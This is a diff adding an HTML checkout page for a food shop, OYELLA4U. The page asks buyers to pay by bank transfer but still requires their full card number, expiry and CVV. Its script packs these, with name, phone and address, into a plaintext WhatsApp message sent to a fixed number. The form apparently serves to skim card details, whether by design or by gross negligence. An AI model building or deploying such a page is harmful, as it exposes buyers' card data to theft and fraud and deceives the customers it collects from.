@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Checkout – OYELLA4U</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #fffaf5;
+      color: #2c3e50;
+      padding: 2rem;
+    }
+
+    h1 {
+      text-align: center;
+      color: #e74c3c;
+    }
+
+    .cart-summary, .customer-form {
+      max-width: 600px;
+      margin: 2rem auto;
+      background: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    }
+
+    .cart-summary ul {
+      list-style: none;
+      padding: 0;
+    }
+
+    .cart-summary li {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 0.6rem;
+    }
+
+    .total {
+      font-weight: bold;
+      text-align: right;
+      margin-top: 1rem;
+      color: #27ae60;
+    }
+
+    label {
+      display: block;
+      margin: 1rem 0 0.3rem;
+      font-weight: 600;
+    }
+
+    input, select {
+      width: 100%;
+      padding: 0.6rem;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+    }
+
+    .submit-btn {
+      margin-top: 2rem;
+      width: 100%;
+      background: #e74c3c;
+      color: white;
+      border: none;
+      padding: 0.9rem;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .submit-btn:hover {
+      background: #c0392b;
+    }
+
+    .payment-instruction {
+      background: #f9f9f9;
+      padding: 1rem;
+      border: 1px dashed #999;
+      border-radius: 8px;
+      margin-top: 1.5rem;
+      font-size: 0.95rem;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Checkout</h1>
+
+  <div class="cart-summary">
+    <h2>Your Order</h2>
+    <ul id="order-list"></ul>
+    <div id="order-total" class="total">Total: ₦0</div>
+  </div>
+
+  <div class="customer-form">
+    <h2>Customer Info</h2>
+    <form id="checkout-form">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" placeholder="Enter full name" required>
+
+      <label for="phone">Phone Number</label>
+      <input type="tel" id="phone" placeholder="e.g. 07012345678" required>
+
+      <label for="address">Delivery Address</label>
+      <input type="text" id="address" placeholder="Street, City, State" required>
+
+      <label for="bank">Select Bank</label>
+      <select id="bank" required>
+        <option value="">-- Select Your Bank --</option>
+        <option>Access Bank</option>
+        <option>GTBank</option>
+        <option>Zenith Bank</option>
+        <option>UBA</option>
+        <option>First Bank</option>
+        <option>Fidelity Bank</option>
+        <option>Union Bank</option>
+        <option>Polaris Bank</option>
+        <option>Ecobank</option>
+        <option>Wema Bank</option>
+        <option>Stanbic IBTC</option>
+        <option>Jaiz Bank</option>
+        <option>Others (Specify below)</option>
+      </select>
+
+      <label for="customBank">If Others, enter bank name:</label>
+      <input type="text" id="customBank" placeholder="Custom Bank Name (Optional)">
+
+      <h2>Card Payment</h2>
+      <label for="cardNumber">ATM Card Number</label>
+      <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+
+      <label for="expiry">Expiry Date (MM/YY)</label>
+      <input type="text" id="expiry" placeholder="08/25" maxlength="5" required>
+
+      <label for="cvv">CVV</label>
+      <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+
+      <div class="payment-instruction">
+        📢 <strong>NOTE:</strong> For now, payment should be transferred to the account below:<br>
+        <strong>Account Name:</strong> OYELLA4U FOODS<br>
+        <strong>Bank:</strong> First Bank<br>
+        <strong>Account Number:</strong> 1234567890<br><br>
+        Kindly send proof of payment and your details to our WhatsApp.
+      </div>
+
+      <button type="submit" class="submit-btn">Confirm Order</button>
+    </form>
+  </div>
+
+  <script>
+    const cartItems = JSON.parse(localStorage.getItem('cartItems')) || [];
+    const orderList = document.getElementById('order-list');
+    const orderTotal = document.getElementById('order-total');
+    const form = document.getElementById('checkout-form');
+
+    let total = 0;
+
+    cartItems.forEach(item => {
+      const li = document.createElement('li');
+      li.textContent = `${item.product} x ${item.quantity} = ₦${item.price * item.quantity}`;
+      orderList.appendChild(li);
+      total += item.price * item.quantity;
+    });
+
+    orderTotal.textContent = `Total: ₦${total}`;
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const name = document.getElementById('name').value;
+      const phone = document.getElementById('phone').value;
+      const address = document.getElementById('address').value;
+      const bank = document.getElementById('bank').value || document.getElementById('customBank').value;
+      const card = document.getElementById('cardNumber').value;
+      const expiry = document.getElementById('expiry').value;
+      const cvv = document.getElementById('cvv').value;
+
+      const message = `Hello! I just placed an order from OYELLA4U 🍽️
+
+Full Name: ${name}
+Phone: ${phone}
+Address: ${address}
+Bank: ${bank}
+Card: ${card}
+Expiry: ${expiry}
+CVV: ${cvv}
+Total: ₦${total}
+
+✅ Items:
+${cartItems.map(item => `${item.product} x ${item.quantity}`).join('\n')}
+      
+Proof of payment will be sent shortly.
+Thank you! 🙌`;
+
+      const whatsappURL = `https://wa.me/2349071636467?text=${encodeURIComponent(message)}`;
+      window.open(whatsappURL, '_blank');
+
+      // Redirect to confirm.html after sending message
+      setTimeout(() => {
+        window.location.href = "confirm.html";
+      }, 1500);
+    });
+  </script>
+
+</body>
+</html>
